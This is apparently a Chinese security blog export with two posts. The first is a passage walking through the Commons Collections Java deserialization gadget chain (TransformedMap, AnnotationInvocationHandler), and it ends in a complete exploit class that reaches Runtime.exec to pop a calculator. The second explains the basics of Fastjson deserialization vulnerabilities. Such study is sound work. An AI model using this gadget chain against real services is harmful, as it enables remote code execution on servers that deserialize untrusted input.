<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//以下省略部分代码</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformedMap</span></span></span><br><span class="line"><span class="class">        <span class="keyword">extends</span> <span class="title">AbstractInputCheckedMapDecorator</span></span></span><br><span class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Serialization version */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">7023152376788900464L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The transformer to use for the key */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer keyTransformer;</span><br><span class="line">    <span class="comment">/** The transformer to use for the value */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">transformValue</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (valueTransformer == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> object;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> valueTransformer.transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Map <span class="title">transformMap</span><span class="params">(Map map)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (map.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> map;</span><br><span class="line">        &#125;</span><br><span class="line">        Map result = <span class="keyword">new</span> LinkedMap(map.size());</span><br><span class="line">        <span class="keyword">for</span> (Iterator it = map.entrySet().iterator(); it.hasNext(); ) &#123;</span><br><span class="line">            Map.Entry entry = (Map.Entry) it.next();</span><br><span class="line">            result.put(transformKey(entry.getKey()), transformValue(entry.getValue()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">		<span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Override to transform the value when using &lt;code&gt;setValue&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value  the value to transform</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the transformed value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span> Commons Collections 3.1</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">put</span><span class="params">(Object key, Object value)</span> </span>&#123;</span><br><span class="line">        key = transformKey(key);</span><br><span class="line">        value = transformValue(value);</span><br><span class="line">        <span class="keyword">return</span> getMap().put(key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>TransformedMap</code>执行<code>setValue/put/putAll</code>中的任意方法都会调用<code>transform</code>方法，从而也就会触发命令执行。我们只需要将之前构造好的恶意<code>ChainedTransformer</code>包装进<code>TransformedMap</code>并想办法触发<code>TransformedMap</code>的<code>setValue/put/putAll</code>方法即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">Map ouputMap = TransformedMap.decorate(innerMap,<span class="keyword">null</span>,chainedTransformer);</span><br></pre></td></tr></table></figure>

<h2 id="4、AnnotationInvocationHandlerMap类"><a href="#4、AnnotationInvocationHandlerMap类" class="headerlink" title="4、AnnotationInvocationHandlerMap类"></a>4、<strong>AnnotationInvocationHandlerMap类</strong></h2><p>在Java的低版本(jdk1.8较低的版本如 1.8u60,在较高的jdk版本该问题类已经被修复)代码中存在<code>AnnotationInvocationHandlerMap</code>类，其<code>readObject</code>方法如下所示</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">         <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">     s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">     <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">     AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         annotationType = AnnotationType.getInstance(type);</span><br><span class="line">     &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">         <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> java.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">     <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">     <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">     <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">         String name = memberValue.getKey();</span><br><span class="line">         Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">         <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">             Object value = memberValue.getValue();</span><br><span class="line">             <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                     value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                 memberValue.setValue(</span><br><span class="line">                         <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                                 value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                 annotationType.members().get(name)));</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><code>AnnotationInvocationHandler</code>类实现了<code>InvocationHandler</code>(<code>Java动态代理</code>)接口和<code>java.io.Serializable</code>接口，它还重写了<code>readObject</code>方法，在<code>readObject</code>方法中还间接的调用了<code>TransformedMap</code>中<code>MapEntry</code>的<code>setValue</code>方法，触发<code>TransformedMap</code>中的<code>checkSetValue</code>方法，从而也就触发了<code>transform</code>方法，完成了整个攻击链的调用。</p>
<p>因为<code>sun.reflect.annotation.AnnotationInvocationHandler</code>是一个内部API专用的类，在外部我们无法通过类名创建出<code>AnnotationInvocationHandler</code>类实例，所以我们需要通过反射的方式创建出<code>AnnotationInvocationHandler</code>对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//jdk1.8高版本该类的方法readObject()是使用了native方法安全更新map，无法再触发</span></span><br><span class="line">Constructor&lt;?&gt; ctor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">InvocationHandler o = (InvocationHandler) ctor.newInstance(Target.class,ouputMap);</span><br></pre></td></tr></table></figure>

<p>我们只需要将这个<code>InvocationHandler</code>对象序列化后就可以得到用于攻击的<code>payload</code>了。</p>
<h2 id="5、总结"><a href="#5、总结" class="headerlink" title="5、总结"></a>5、总结</h2><p>总的来说如果在实际环境中想要查看是否存在反序列化漏洞可以从以下几个点切入进行分析</p>
<ol>
<li>判断是否存在反序列化点(即<code>readObject()</code>)</li>
<li>反序列化点的输入是否可控</li>
<li>是否用到了一些常见Gadget的包(在这个例子中就是<code>org.apache.commons.collections</code>)</li>
</ol>
<h2 id="6、完整代码"><a href="#6、完整代码" class="headerlink" title="6、完整代码"></a>6、<strong>完整代码</strong></h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeMapForTransformer</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="comment">//利用AnnotationInvocationHandler反序列化，直接触发Transformer ---jdk1.8高版本已经更新无法再成功了</span></span><br><span class="line">        testAnnotationInvocationHandlerMap(transformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//测试TransformerMap在map的key、value改变中触发</span></span><br><span class="line">        <span class="comment">//testMap(transformer);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试AnnotationInvocationHandler反序列化中，直接触发Transformer</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testAnnotationInvocationHandlerMap</span><span class="params">(Transformer transformer)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//转化map</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        Map ouputMap = TransformedMap.decorate(innerMap,<span class="keyword">null</span>,transformer);</span><br><span class="line">        <span class="comment">//jdk1.8该类的方法readObject()是使用了native方法安全更新map，无法再触发</span></span><br><span class="line">        Constructor&lt;?&gt; ctor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler o = (InvocationHandler) ctor.newInstance(Target.class,ouputMap);</span><br><span class="line">        <span class="comment">//序列化输出</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = serialize(o);</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        deserialize(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试TransformerMap在包装的map中，key、value改变触发Transformer</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testMap</span><span class="params">(Transformer transformer)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//转化map</span></span><br><span class="line">        Map ouputMap = TransformedMap.decorate(<span class="keyword">new</span> HashMap&lt;&gt;(),<span class="keyword">null</span>,transformer);</span><br><span class="line">        <span class="comment">//序列化输出</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = serialize(ouputMap);</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        Map innerMap = deserialize(bytes);</span><br><span class="line">        <span class="comment">//put操作触发，命令链</span></span><br><span class="line">        innerMap.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(Object o) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt;<span class="function">T <span class="title">deserialize</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ByteArrayInputStream byteArrayInputStream = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(byteArrayInputStream);</span><br><span class="line">        T o = (T) objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson历史漏洞分析(一)--基础知识</title>
    <url>/2021/11/18/Fastjson(%E4%B8%80)-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2022cba1e1a9d34336a70b7cf31c47616f/</url>
    <content><![CDATA[<h1 id="Fastjson-一-基础知识"><a href="#Fastjson-一-基础知识" class="headerlink" title="Fastjson(一)-基础知识"></a>Fastjson(一)-基础知识</h1><p><img src="/2021/11/18/Fastjson(%E4%B8%80)-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2022cba1e1a9d34336a70b7cf31c47616f/Untitled.png" alt="Untitled"></p>
<blockquote>
<p>本文主要分析Fastjson的历史反序列化漏洞，首先需要了解一些漏洞相关的知识</p>
</blockquote>
<h2 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h2><p>Fastjson是Alibaba开发的Java<code>语言编写的高性能JSON库，用于将数据在</code>JSON和Java Object之间互相转换，提供两个主要接口<code>JSON.toJSONString</code>和<code>JSON.parseObject/JSON.parse</code>来分别实现序列化和反序列化操作。</p>
<h2 id="2、Fastjson漏洞相关特性"><a href="#2、Fastjson漏洞相关特性" class="headerlink" title="2、Fastjson漏洞相关特性"></a>2、Fastjson漏洞相关特性</h2><ul>
<li>当反序列化为<code>JSON.parseObject(*)</code>形式即未指定class时，会调用反序列化得到的类的构造函数、所有属性的getter方法、JSON里面的非私有属性的setter方法，其中properties属性的getter方法调用了两次；</li>
<li>当反序列化为<code>JSON.parseObject(*,*.class)</code>形式即指定class时，只调用反序列化得到的类的构造函数、JSON里面的非私有属性的setter方法、properties属性的getter方法；</li>
<li>当反序列化为<code>JSON.parseObject(*)</code>形式即未指定class进行反序列化时得到的都是JSONObject类对象，而只要指定了class即<code>JSON.parseObject(*,*.class)</code>形式得到的都是特定的Student类；</li>
</ul>
<span id="more"></span>

<p><strong>下面直接引用结论，Fastjson会对满足下列要求的setter/getter方法进行调用：</strong></p>
<p>满足条件的setter：</p>
<ul>
<li>函数名长度大于4且以set开头</li>
<li>非静态函数</li>
<li>返回类型为void或当前类</li>
<li>参数个数为1个</li>
</ul>
<p>满足条件的getter：</p>
<ul>
<li>函数名长度大于等于4</li>
<li>非静态方法</li>
<li>以get开头且第4个字母为大写</li>
<li>无参数</li>
<li>返回值类型继承自<code>Collection</code>或<code>Map</code>或<code>AtomicBoolean</code>或<code>AtomicInteger</code>或<code>AtomicLong</code></li>
</ul>
<p>注意，除了<code>getter</code>方法和<code>setter</code>方法外，还有个is方法这里没有列举，可自行测试。</p>
<p>前面的<code>properties</code>私有属性，其类型为<code>Properties</code>，而<code>Properties</code>是继承于<code>Hashtable</code>，<code>Hashtable</code>是实现<code>Map</code>接口类的类，因此<code>properties</code>私有属性的<code>getter</code>方法时继承自<code>Map</code>，从而能够成功被<code>Fastjson</code>调用。</p>
<h2 id="3、漏洞重点"><a href="#3、漏洞重点" class="headerlink" title="3、漏洞重点"></a>3、漏洞重点</h2><p>若反序列化指定类型的类如<code>Student obj = JSON.parseObject(text, Student.class);</code>，该类本身的构造函数、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞；</p>
<p>若反序列化未指定类型的类如<code>Object obj = JSON.parseObject(text, Object.class);</code>，该若该类的子类的构造方法、<code>setter</code>方法、<code>getter</code>方法存在危险操作，则存在<code>Fastjson</code>反序列化漏洞；</p>
<h2 id="4、总结"><a href="#4、总结" class="headerlink" title="4、总结"></a>4、总结</h2><p>总的来说，因为<code>Fastjson</code>在反序列化的过程中会调用该类的构造方法，<code>setter</code>和<code>getter</code>方法，一旦其中存在危险操作则有可能存在反序列化漏洞</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><hr>
<p><a href="https://www.mi1k7ea.com/2019/11/03/Fastjson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/#%E5%B0%8F%E7%BB%93">Fastjson系列一–反序列化漏洞基本原理</a></p>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
</search>
